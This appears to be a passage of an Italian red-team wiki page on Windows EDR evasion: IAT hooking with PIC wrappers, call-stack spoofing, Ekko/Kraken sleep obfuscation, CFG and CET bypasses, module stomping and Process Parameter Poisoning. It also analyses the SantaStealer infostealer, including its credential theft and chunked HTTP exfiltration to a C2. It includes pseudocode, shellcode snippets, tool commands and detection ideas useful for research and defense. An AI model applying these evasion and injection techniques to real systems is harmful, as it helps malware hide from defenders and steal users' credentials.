I Red Team possono spostare l'evasione runtime dall'impianto C2 direttamente nel modulo target eseguendo l'hooking della sua Import Address Table (IAT) e instradando API selezionate attraverso codice position-independent (PIC) controllato dall'attaccante. Questo generalizza l'evasione oltre la piccola superficie API esposta da molti kit (ad esempio, CreateProcessA) ed estende le stesse protezioni a BOFs e DLL di post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio di alto livello
- Stagliare un blob PIC insieme al modulo target usando un reflective loader (anteposto o companion). Il PIC deve essere self-contained e position-independent.
- Durante il caricamento della DLL host, percorrere il suo IMAGE_IMPORT_DESCRIPTOR e modificare le entry IAT degli import target (ad esempio, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) affinché puntino a sottili wrapper PIC.
- Ogni wrapper PIC esegue le evasions prima di effettuare il tail-calling dell'indirizzo dell'API reale. Le evasions tipiche includono:
- Memory mask/unmask intorno alla chiamata (ad esempio, cifrare le regioni del beacon, RWX→RX, modificare i nomi/le autorizzazioni delle pagine), quindi ripristinare dopo la chiamata.
- Call-stack spoofing: costruire uno stack benigno ed eseguire la transizione verso l'API target in modo che l'analisi del call stack risolva i frame attesi.<sup>[[9]](#references)</sup>
- Per la compatibilità, esportare un'interfaccia in modo che uno script Aggressor (o equivalente) possa registrare quali API sottoporre a hook per Beacon, BOFs e DLL di post-exploitation.

Perché usare l'IAT hooking in questo caso
- Funziona con qualsiasi codice che utilizzi l'import sottoposto a hook, senza modificare il codice del tool né fare affidamento su Beacon per effettuare il proxy di API specifiche.
- Copre le DLL di post-exploitation: l'hooking di LoadLibrary* consente di intercettare i caricamenti dei moduli (ad esempio, System.Management.Automation.dll, clr.dll) e applicare la stessa masking/stack evasion alle loro chiamate API.
- Ripristina l'uso affidabile dei comandi di post-exploitation che creano processi contro le detection basate sul call stack, eseguendo il wrapping di CreateProcessA/W.

Schema minimo di IAT hook (pseudocodice C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocations/ASLR e prima del primo utilizzo dell'import. Reflective loader come TitanLdr/AceLdr dimostrano l'hooking durante il `DllMain` del modulo caricato.
- Mantieni i wrapper minimi e compatibili con PIC; risolvi la vera API tramite il valore IAT originale acquisito prima del patching o tramite `LdrGetProcedureAddress`.
- Usa transizioni RW → RX per il PIC ed evita di lasciare pagine writable+executable.

Stub di call-stack spoofing
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate falsa (return address all'interno di moduli benigni) e poi eseguono il pivot verso la vera API.
- Questo elude i rilevamenti che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbinali a tecniche di stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Integrazione operativa
- Anteponi il reflective loader alle DLL post-ex, in modo che il PIC e gli hook vengano inizializzati automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target, così Beacon e BOFs beneficiano in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Considerazioni di rilevamento/DFIR
- Integrità IAT: entry che risolvono a indirizzi non-image (heap/anon); verifica periodica dei puntatori agli import.
- Anomalie dello stack: return address che non appartengono a immagini caricate; transizioni improvvise verso PIC non-image; progenie `RtlUserThreadStart` incoerente.
- Telemetria del loader: scritture in-process sulla IAT, attività precoce di `DllMain` che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione del caricamento delle immagini: se fai hooking di `LoadLibrary*`, monitora i caricamenti sospetti di assembly automation/clr correlati a eventi di memory masking.

Building block ed esempi correlati
- Reflective loader che eseguono IAT patching durante il caricamento (ad esempio TitanLdr, AceLdr)
- Hook di memory masking (ad esempio simplehook) e PIC per lo stack-cutting (stackcutting)
- Stub PIC per il call-stack spoofing (ad esempio Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hook tramite un PICO residente

Se controlli un reflective loader, puoi eseguire l'hooking degli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver personalizzato che controlla prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Costruisci un **PICO residente** (oggetto PIC persistente) che sopravviva dopo che il PIC transitorio del loader si è liberato.
- Esporta una funzione `setup_hooks()` che sovrascriva il resolver degli import del loader (ad esempio `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, ignora gli import ordinali e usa una ricerca degli hook basata su hash, come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook al link time con le entry Crystal Palace `addhook "MODULE$Func" "hook"`. L'hook rimane valido perché vive all'interno del PICO residente.

Questo produce una **redirezione IAT durante l'import** senza patchare la code section della DLL caricata dopo il caricamento.

### Forzare gli import sottoponibili a hooking quando il target usa il PEB-walking

Gli hook durante l'import vengono attivati solo se la funzione si trova effettivamente nella IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza import entry), forza un import reale affinché il percorso `ProcessImports()` del loader possa intercettarlo:

- Sostituisci la risoluzione degli export tramite hash (ad esempio `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore emette una entry IAT, consentendo l'intercettazione quando il reflective loader risolve gli import.

### Sleep/idle obfuscation in stile Ekko senza patchare `Sleep()`

Invece di patchare `Sleep`, esegui l'hooking delle **primitive effettive di attesa/IPC** usate dall'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per le attese lunghe, avvolgi la chiamata in una catena di obfuscation in stile Ekko che cifra l'immagine in memoria durante l'idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` preparati.
- Catena tipica (x64): imposta l'immagine su `PAGE_READWRITE` → cifra con RC4 tramite `advapi32!SystemFunction032` l'intera immagine mappata → esegui l'attesa bloccante → decifra con RC4 → **ripristina i permessi per sezione** attraversando le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un `CONTEXT` modello; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per invocare ogni passaggio.

Dettaglio operativo: restituisci “success” per le attese lunghe (ad esempio `WAIT_OBJECT_0`) affinché il chiamante prosegua mentre l'immagine è mascherata. Questo pattern nasconde il modulo agli scanner durante le finestre di idle ed evita la classica signature di `Sleep()` “patchato”.

Idee di rilevamento (basate sulla telemetria)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- `advapi32!SystemFunction032` utilizzato su buffer contigui di grandi dimensioni, pari a quella dell'immagine.
- `VirtualProtect` su range estesi seguito dal ripristino personalizzato dei permessi per sezione.

### Registrazione CFG a runtime per i gadget di sleep-obfuscation

Sui target con CFG abilitato, il primo salto indiretto verso un gadget a metà funzione come `jmp [rbx]` o `jmp rdi` di solito causa il crash del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadati CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken all'interno di processi hardenizzati:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta usata dalla catena con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ed entry `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all'interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` deve iniziare dalla **base dell'immagine** e coprire la **dimensione completa dell'immagine**.
- Per regioni mappate manualmente/PIC/stomped, usa invece la **base dell'allocazione** e la dimensione dell'allocazione.
- Contrassegna non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscall di wait/event) e qualsiasi sezione eseguibile controllata dall'attaccante che diventerà una destinazione indiretta.

Questo trasforma le catene di sleep in stile ROP/JOP da primitive che “funzionano solo nei processi senza CFG” in una primitive riutilizzabile per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Stack spoofing compatibile con CET per thread in sleep

La sostituzione completa di `CONTEXT` è rumorosa e può interrompersi sui sistemi con CET Shadow Stack, perché un `Rip` falsificato deve comunque corrispondere all'hardware shadow stack. Un pattern più sicuro di sleep-masking è:<sup>[[30]](#references)</sup>

- Scegli un altro thread nello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Acquisisci il contesto reale del thread in sleep con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto falsificato, lasciando intatti `Rsp`/lo stato dello stack falsificati.
- Durante la finestra di sleep, copia l'`NT_TIB` del thread falsificato nel TEB corrente, così gli stack walker effettuano l'unwind all'interno di un range di stack legittimo.
- Al termine dell'attesa, ripristina il TIB originale e il contesto del thread.

Questo mantiene un instruction pointer coerente con CET, inducendo però in errore gli stack walker EDR che si affidano ai metadati dello stack del TEB per convalidare gli unwind.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue produce troppe signature, la stessa sequenza di sleep-encrypt-spoof-restore può essere eseguita da un helper thread sospeso usando APC accodate:<sup>[[27]](#references)</sup>

- Crea un helper thread con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC preparati con `NtQueueApcThread` e consumali con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell'heap invece che nello stack dell'helper, per evitare di esaurire lo stack predefinito del thread di 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l'evento di avvio e bloccare l'esecuzione.
- Sospendi il thread principale prima di ripristinare TIB/contesto (`NtSuspendThread` → restore → `NtResumeThread`) per ridurre la finestra di race in cui uno scanner potrebbe catturare uno stack parzialmente ripristinato.

Questo sostituisce la signature `CreateTimerQueueTimer` + `NtContinue` con una signature helper-thread/APC, mantenendo gli stessi obiettivi di masking RC4 e stack spoofing.

Idee aggiuntive di rilevamento
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, wait o dispatch APC.
- `GetThreadContext`/`SetThreadContext` attorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di brevi signature di gadget come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all'interno di moduli firmati.


## Precision Module Stomping

Module stomping esegue i payload dalla **sezione `.text` di una DLL già mappata all'interno del processo target**, invece di allocare memoria eseguibile privata evidente o caricare una nuova DLL sacrificale. Il target della sovrascrittura dovrebbe essere un'**immagine caricata e supportata da disco**, il cui spazio di codice possa assorbire il payload senza corrompere i percorsi di codice ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Selezione affidabile del target

Il module stomping ingenuo contro moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una regione di codice troppo piccola causerà il crash del processo. Un workflow più affidabile è:

1. Enumera i moduli del processo target e mantieni una **allowlist composta solo dai nomi** delle DLL già caricate.
2. Costruisci prima il payload e registra la sua **dimensione esatta in byte**.
3. Scansiona le DLL candidate su disco e confronta `Misc_VirtualSize` della sezione PE **`.text`** con la dimensione del payload. Questo è più importante della dimensione del file perché riflette la dimensione della sezione eseguibile **quando viene mappata in memoria**.
4. Analizza l'**Export Address Table (EAT)** e scegli l'RVA di una funzione esportata come offset iniziale dello stomp.
5. Calcola il **blast radius**: se il payload supera il limite della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Esempi tipici di helper di recon/selezione osservati in the wild:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Prefer DLLs **already loaded** in the remote process to avoid the telemetry of `LoadLibrary`/unexpected image loads.
- Prefer exports that are rarely executed by the target application, otherwise normal code paths may hit the stomped bytes before or after thread creation.
- Large implants often require changing shellcode embedding from a string literal to a **byte-array/braced initializer** so the full buffer is represented correctly in the injector source.

Detection ideas
- Remote writes into **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) instead of the more common private RWX/RX allocations.
- Export entry points whose in-memory bytes no longer match the backing file on disk.
- Remote threads or context pivots that begin execution inside a legitimate DLL export whose first bytes were recently modified.
- Suspicious `VirtualProtect(Ex)` / `WriteProcessMemory` sequences against DLL `.text` pages followed by thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) è una tecnica di **process-injection / EDR-evasion** che evita il classico remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Invece di copiare byte in un target già in esecuzione, sfrutta il fatto che Windows **copia alcuni parametri di avvio di `CreateProcessW` nel processo figlio** e li memorizza all'interno di `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

I carrier utili sono:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vincoli pratici dei carrier:

- `lpCommandLine` deve puntare a memoria **writable** per `CreateProcessW` ed è limitato a **32.767 caratteri Unicode**, incluso il terminatore null.
- `lpEnvironment` deve essere un environment block Unicode composto da stringhe successive `NAME=VALUE\0`, terminate da un ulteriore `\0`.
- `lpReserved` è ufficialmente riservato, quindi il mapping verso `ShellInfo` deve essere trattato come un dettaglio di implementazione e non come un contratto documentato stabile.

Questo trasforma la normale creazione del processo nella **payload-transfer primitive**. L'operatore crea il processo figlio con startup data controllati dall'attaccante e lascia che sia Windows a eseguire la copia cross-process.

### Remote lookup flow without remote write APIs

Dopo la creazione del processo figlio, si risolve il buffer copiato usando primitive **read-only**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → ottenere `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leggere il `PEB` remoto
3. Seguire `PEB.ProcessParameters`
4. Leggere `RTL_USER_PROCESS_PARAMETERS`
5. Usare il puntatore selezionato:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Flusso minimo:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Esecuzione del parameter buffer copiato

La parameter region copiata è solitamente `RW`, non eseguibile. Una catena P3 comune è:

1. Creare il processo normalmente (non sospeso)
2. Rendere eseguibile la pagina parameter scelta con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Riutilizzare l'handle del main thread già restituito in `PROCESS_INFORMATION`
4. Reindirizzare l'esecuzione con `NtSetContextThread` (`CONTEXT_CONTROL`, sovrascrivendo `RIP`)

A differenza dei workflow classici di thread hijacking, questo **non richiede** `SuspendThread` / `ResumeThread`; il context può essere modificato direttamente sull'handle del main thread restituito.

In questo modo si evitano diverse API comunemente monitorate per l'injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- spesso anche `SuspendThread` / `ResumeThread`

### Limitazione dei null byte e staged shellcode

Tutti e tre i carrier sono dati **stringa o simili a stringhe**, quindi un payload raw contenente `0x00` viene troncato durante il trasferimento. Una soluzione pratica è un **first stage** null-free che ricostruisce le costanti a runtime e poi carica un secondo stage arbitrario.

Un pattern semplice è la sintesi delle costanti basata su XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Questo consente al first stage di creare stringhe per lo stack, argomenti API, percorsi DLL o un loader shellcode di second stage senza incorporare byte nulli nel parametro trasportato.

### Chiamate API basate sullo stack dal first stage

Quando il first stage deve chiamare API come `LoadLibraryA`, può:

- effettuare il push della stringa/del buffer sullo stack del target
- riservare lo **shadow space di 32 byte x64**
- impostare `RCX`, `RDX`, `R8`, `R9` su costanti o puntatori relativi a `RSP`
- mantenere `RSP` **allineato a 16 byte** prima della chiamata

Un second stage può quindi essere copiato dallo stack in un'allocazione `PAGE_READWRITE`, convertito in `PAGE_EXECUTE_READ` con `VirtualProtect` e raggiunto tramite un salto, evitando un'allocazione RWX diretta.

### Idee per il rilevamento

Buone opportunità di hunting menzionate dagli autori:

- `VirtualProtectEx` / `NtProtectVirtualMemory` che rendono **eseguibili le pagine dei parametri del processo**
- tale modifica della protezione seguita da `SetThreadContext` / `NtSetContextThread`
- letture remote del `PEB` e successivamente di `RTL_USER_PROCESS_PARAMETERS`
- valori di `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` insolitamente lunghi o ad alta entropia durante la creazione del processo

### Note

- P3 è un **trick di trasferimento tra processi**, non una primitiva di esecuzione completa di per sé: il parametro copiato necessita ancora di una modifica dei permessi a esecuzione e di un metodo di redirezione dell'esecuzione.
- `RtlCreateProcessReflection` / Dirty Vanity è stato preso in considerazione dagli autori, ma scartato perché raggiunge internamente primitive sospette come `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Tradecraft di SantaStealer per l'evasione fileless e il furto di credenziali

SantaStealer (aka BluelineStealer) illustra come i moderni info-stealer combinino AV bypass, anti-analysis e accesso alle credenziali in un unico workflow.<sup>[[24]](#references)</sup>

### Controllo del layout della tastiera e ritardo nel sandbox

- Un flag di configurazione (`anti_cis`) enumera i layout della tastiera installati tramite `GetKeyboardLayoutList`. Se viene trovato un layout cirillico, il sample crea un marker `CIS` vuoto e termina prima di eseguire gli stealer, assicurandosi di non detonare mai nei locali esclusi e lasciando al contempo un artefatto utile per l'hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logica `check_antivm` stratificata

- La variante A percorre l'elenco dei processi, calcola l'hash di ogni nome con un checksum rolling personalizzato e lo confronta con blocklist incorporate per debugger/sandbox; ripete il checksum sul nome del computer e controlla directory di lavoro come `C:\analysis`.
- La variante B esamina le proprietà del sistema (soglia minima del numero di processi, uptime recente), chiama `OpenServiceA("VBoxGuest")` per rilevare le additions di VirtualBox ed esegue controlli temporali intorno alle attese per individuare il single-stepping. Qualsiasi rilevamento interrompe l'esecuzione prima dell'avvio dei moduli.

### Helper fileless + caricamento reflective con doppio ChaCha20

- La DLL/EXE principale incorpora un helper per le credenziali di Chromium che viene scritto su disco oppure mappato manualmente in memoria; la modalità fileless risolve autonomamente import e relocation, quindi non vengono scritti artefatti dell'helper.
- Tale helper memorizza una DLL di second stage cifrata due volte con ChaCha20 (due chiavi da 32 byte + nonce da 12 byte). Dopo entrambi i passaggi, carica il blob in modo reflective (senza `LoadLibrary`) e chiama gli export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivati da [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Le routine di ChromElevator usano il process hollowing reflective tramite direct syscall per effettuare l'injection in un browser Chromium attivo, ereditare le chiavi AppBound Encryption e decrittografare password/cookie/carte di credito direttamente dai database SQLite nonostante l'hardening di ABE.


### Raccolta modulare in memoria ed esfiltrazione HTTP a chunk

- `create_memory_based_log` itera su una tabella globale di puntatori a funzione `memory_generators` e crea un thread per ogni modulo abilitato (Telegram, Discord, Steam, screenshot, documenti, estensioni del browser, ecc.). Ogni thread scrive i risultati in buffer condivisi e segnala il numero di file dopo una finestra di join di circa 45 s.
- Al termine, tutto viene compresso con la libreria `miniz` collegata staticamente come `%TEMP%\\Log.zip`. `ThreadPayload1` attende quindi 15 s e trasmette l'archivio in chunk da 10 MB tramite HTTP POST a `http://<C2>:6767/upload`, simulando il boundary `multipart/form-data` di un browser (`----WebKitFormBoundary***`). Ogni chunk aggiunge `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opzionale, mentre l'ultimo chunk aggiunge `complete: true` per consentire al C2 di sapere che il riassemblaggio è terminato.

## References

- [1] [Tradecraft avanzato per l'evasione: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack: niente più pass gratuiti per il malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentazione](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – esempio](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – esempio](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC con call-stack spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuova catena d'infezione e offuscamento basato su ConfuserEx per DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Dovresti fidarti del tuo zero trust? Bypass dei posture check di Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Prima di ToolShell: analisi delle precedenti operazioni ransomware di Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abuso degli export inoltrati](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario degli export inoltrati di Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordine di ricerca delle dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Sicurezza dei processi e diritti di accesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Riferimento EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrastare gli EDR con il supporto del Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Violare la protective shell di Windows Defender con la tecnica del folder redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Riferimento del comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: da RAT a builder a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sta arrivando in città: un nuovo e ambizioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Decrittografia della Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: sconfiggere il malware Node.js con l'API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: mettere a riposo Adaptix con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Avvelenamento dei parametri di processo](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET e stack spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Offuscamento del sonno Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Nascondere il Dotnet ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abuso di Chrome Remote Desktop nelle operazioni di Red Team: una guida pratica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
